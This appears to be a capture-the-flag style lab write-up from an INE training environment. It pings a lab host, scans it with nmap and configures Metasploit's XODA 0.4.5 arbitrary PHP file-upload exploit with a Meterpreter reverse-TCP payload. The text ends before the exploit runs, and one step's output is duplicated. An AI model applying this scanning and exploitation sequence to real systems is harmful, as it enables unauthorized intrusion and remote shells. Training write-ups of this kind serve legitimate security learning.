 1. T1046 : Network Service Scanning


### Objective
Identify the ports open on the second target machine using appropriate Metasploit modules

### Skills Learned
- Enumeration 

### Tools Used

- Metasploit
-Bash
-Terminal
-Nmap

### Steps

The lab environment and objective are described in the "Tasks" tab
<img width="1918" height="999" alt="Screenshot 2025-08-22 at 6 38 45 PM" src="https://github.com/user-attachments/assets/fe7f9827-b329-4778-bb53-b04b71a1fed6" />

First, let's ping the objective
```
┌──(root㉿INE)-[~]
└─# ping demo1.ine.local
PING demo1.ine.local (192.70.151.3) 56(84) bytes of data.
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=1 ttl=64 time=0.145 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=2 ttl=64 time=0.057 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=3 ttl=64 time=0.056 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=4 ttl=64 time=0.055 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=5 ttl=64 time=0.060 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=6 ttl=64 time=0.056 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=7 ttl=64 time=0.048 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=8 ttl=64 time=0.071 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=9 ttl=64 time=0.055 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=10 ttl=64 time=0.056 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=11 ttl=64 time=0.054 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=12 ttl=64 time=0.048 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=13 ttl=64 time=0.053 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=14 ttl=64 time=0.053 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=15 ttl=64 time=0.054 ms
^C
--- demo1.ine.local ping statistics ---
15 packets transmitted, 15 received, 0% packet loss, time 14361ms
rtt min/avg/max/mdev = 0.048/0.061/0.145/0.022 ms

```
Then, run nmap over the target 

```
┌──(root㉿INE)-[~]
└─# nmap -Pn -sV demo1.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-25 04:51 IST
Nmap scan report for demo1.ine.local (192.70.151.3)
Host is up (0.000022s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
MAC Address: 02:42:C0:46:97:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.44 seconds

```
And we can see that the port 80 is open and runs a http service. Now open msfconsole

Since we know there's a vulnerability associated to XODA, search for the exploit.

```
msf6 > search xoda

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/webapp/xoda_file_upload  2012-08-21       excellent  Yes    XODA 0.4.5 Arbitrary PHP File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/xoda_file_upload

```
Select the exploit:

```
msf6 > search xoda

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/webapp/xoda_file_upload  2012-08-21       excellent  Yes    XODA 0.4.5 Arbitrary PHP File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/xoda_file_upload

```
Now let's see the configuration options, with the show options command

```
msf6 exploit(unix/webapp/xoda_file_upload) > show options

Module options (exploit/unix/webapp/xoda_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /xoda/           yes       The base path to the web application
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   XODA 0.4.5



View the full module info with the info, or info -d command.


```

now, set the parameters

```
msf6 exploit(unix/webapp/xoda_file_upload) > set RHOSTS demo1.ine.local
RHOSTS => demo1.ine.local
msf6 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /
TARGETURI => /
msf6 exploit(unix/webapp/xoda_file_upload) > show options

Module options (exploit/unix/webapp/xoda_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     demo1.ine.local  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   XODA 0.4.5



View the full module info with the info, or info -d command.

```
